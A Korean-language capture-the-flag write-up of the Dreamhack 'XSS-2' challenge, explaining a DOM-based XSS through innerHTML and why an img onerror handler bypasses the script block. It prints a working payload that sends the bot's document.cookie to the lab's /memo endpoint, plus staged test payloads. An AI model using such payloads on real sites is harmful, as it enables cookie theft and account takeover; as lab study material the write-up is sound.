---
title: "XSS-2 (Dreamhack,B1)" 
date: 2026-06-23 
draft: false 
tags: ["XSS"] 
ShowToc: true
--- 
## 문제 분석

- `/vuln`: `param`을 받아 클라이언트 JS가 `innerHTML`로 DOM에 삽입 → DOM-based XSS가 터지는 지점
- `/flag`: POST로 받은 `param`을 `check_xss`에 넘김 → `/vuln?param=...` URL로 조립 → FLAG가 쿠키로 심긴 봇(Selenium)이 그 URL을 방문 (XSS-1과 동일)
- `/memo`: `memo` 파라미터로 받은 값을 전역 변수 `memo_text`에 누적 저장하고 보여줌 (XSS-1과 동일)

```html
<div id='vuln'></div>
<script>
  var x = new URLSearchParams(location.search);
  document.getElementById('vuln').innerHTML = x.get('param');
</script>
```

> 핵심: 흐름(봇 호출 → 쿠키 탈취 → /memo 수신)도, 수신처(/memo)도, 전송 수단(new Image().src)도 XSS-1과 동일, 차이는 `document.write`로 서버 직접 출력이 아니라 `innerHTML`이라는 점

## 취약점

`param`을 검증 없이 `innerHTML`에 삽입 → 입력이 글자가 아니라 HTML로 해석됨. 다만 `innerHTML`은 삽입된 `<script>`를 실행하지 않으므로, XSS-1에서 쓰던 `<script>` 페이로드가 그대로는 안 통함 → 이벤트 핸들러 태그로 우회

> 당위: HTML5 명세상, 페이지 로드 시 파서가 만난 `<script>`만 실행되고 `innerHTML`로 나중에 끼워넣은 `<script>`는 DOM에 생성되되 실행이 차단됨 → 사용자 입력을 `innerHTML`에 넣는 순간 곧바로 코드 실행으로 뚫리는 것을 막기 위한 보안 규칙 → XSS-1처럼 `<script>` 사용 불가

## 공격

### 흐름 설계

XSS-1과 동일.

1. 공격자가 `/flag`에 `param` 입력 → 봇 호출
2. 봇이 `/vuln?param=공격자페이로드` 방문 → 봇 브라우저에서 실행
3. 그 코드가 봇의 쿠키(FLAG)를 읽음
4. 읽은 쿠키를 `/memo`로 전송
5. 공격자가 `/memo`를 열어 FLAG 확인

> 수신처 확보(`/memo`가 전역 변수라 봇·공격자가 저장소 공유)와 전송 수단(`new Image().src`로 GET 자동 발생)의 당위는 XSS-1과 동일

### sink 우회

`<script>`가 막히므로, 삽입 즉시 브라우저가 스스로 JS를 실행하게 만드는 이벤트 핸들러를 사용

```html
<img src=x onerror="...">
```

> 당위: `src=x`는 존재하지 않는 이미지 → 로드 실패로 error 이벤트 발생 → `onerror`에 적힌 JS 자동 실행. `onerror`는 처음부터 정상 HTML 속성이라 "`innerHTML`로 넣은 `<script>`는 차단" 규칙이 걸리지 않음 → `innerHTML`로 꽂아도 그대로 동작

### 페이로드 조립

`param`에 넣을 최종 페이로드:

```html
<img src=x onerror="new Image().src='http://127.0.0.1:8000/memo?memo='+document.cookie">
```

> 당위: 바깥 `onerror`는 큰따옴표로 감싸므로 안쪽 URL 문자열은 작은따옴표로 → 따옴표 충돌 방지 `document.cookie`는 따옴표 밖에 두고 `+`로 이어야 실제 쿠키값이 전송(안에 넣으면 글자 그대로 전송)

### 단계적 검증

한 번에 완성 페이로드를 넣지 않고 쪼개서 확인 → XSS-1과 달리 1단계가 "script 실행"이 아니라 이벤트 핸들러

1. `<img src=x onerror=alert(1)>`: 이벤트 핸들러 실행 여부
2. `<img src=x onerror="new Image().src='http://127.0.0.1:8000/memo?memo=test'">`: `/memo`에 `test` 뜨는지로 전송 통로 검증
3. `test`를 `document.cookie`로 교체: 쿠키 탈취

> 당위: 완성 페이로드를 한 번에 넣으면 실패 시 이벤트가 안 터진 건지 / 전송이 틀린 건지 / 쿠키 읽기가 틀린 건지 구분 불가 → 끊어서 검증하면 실패 지점을 좁힐 수 있음 특히 `/flag`는 good/wrong만 돌려주고 에러 출력도 막혀 있어서 로컬 `/vuln`에서 먼저 터뜨려보는 게 유일한 디버깅 수단

## 풀이

`/flag` 폼의 입력칸에 페이로드 제출 → 봇이 방문/실행 → `/memo`에서 쿠키 확인

## 배운 점

- XSS-1과 결함의 본질(입력이 HTML로 해석됨)·공격 목표(봇 쿠키 탈취)·유출 통로(/memo + new Image)는 전부 동일 → 사실상 같은 문제
- 갈리는 단 하나: sink. `document.write`/서버 출력은 `<script>`를 그대로 실행, `innerHTML`은 `<script>`를 차단 → 이벤트 핸들러(`<img onerror>`) 필요
- 판별점: "param이 어떤 sink로 DOM에 들어가는가"가 페이로드 형태를 통째로 결정 → 같은 XSS라도 sink부터 확인하는 게 첫 분기점
- XSS-1과 묶어 ***같은 결함, 다른 sink***의 대조 쌍으로 기억